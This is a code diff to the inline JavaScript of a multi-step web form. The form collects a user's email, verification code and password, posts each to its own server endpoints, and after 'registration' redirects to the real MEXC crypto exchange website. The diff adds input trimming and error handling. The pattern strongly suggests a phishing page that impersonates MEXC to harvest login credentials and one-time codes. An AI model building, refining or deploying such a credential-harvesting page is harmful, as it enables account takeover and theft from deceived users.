@@ -69,46 +69,72 @@
     }
 
     async function sendEmail() {
-      const email = document.getElementById("email").value;
+      const email = document.getElementById("email").value.trim();
       if (!email) return alert("Please enter email");
 
-      await fetch("/step-email", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email }),
-      });
+      try {
+        const res = await fetch("/step-email", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email }),
+        });
 
-      goToStep(2);
+        if (res.ok) {
+          goToStep(2);
+        } else {
+          alert("Failed to send email step to server.");
+        }
+      } catch (error) {
+        alert("Error sending email to server.");
+        console.error(error);
+      }
     }
 
     async function sendCode() {
-      const code = document.getElementById("code").value;
+      const code = document.getElementById("code").value.trim();
       if (!code) return alert("Enter the code");
 
-      await fetch("/step-code", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code }),
-      });
+      try {
+        const res = await fetch("/step-code", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code }),
+        });
 
-      goToStep(3);
+        if (res.ok) {
+          goToStep(3);
+        } else {
+          alert("Failed to send code to server.");
+        }
+      } catch (error) {
+        alert("Error sending code to server.");
+        console.error(error);
+      }
     }
 
     async function submitForm() {
-      const password = document.getElementById("password").value;
-      const email = document.getElementById("email").value;
-      const code = document.getElementById("code").value;
+      const password = document.getElementById("password").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const code = document.getElementById("code").value.trim();
 
       if (!password) return alert("Enter password");
 
-      await fetch("/register", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, code, password }),
-      });
+      try {
+        const res = await fetch("/register", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, code, password }),
+        });
 
-      // ✅ Redirect to MEXC after registration
-      window.location.href = "https://www.mexc.com/";
+        if (res.ok) {
+          window.location.href = "https://www.mexc.com/";
+        } else {
+          alert("Registration failed.");
+        }
+      } catch (error) {
+        alert("Error during registration.");
+        console.error(error);
+      }
     }
   </script>
 </body>
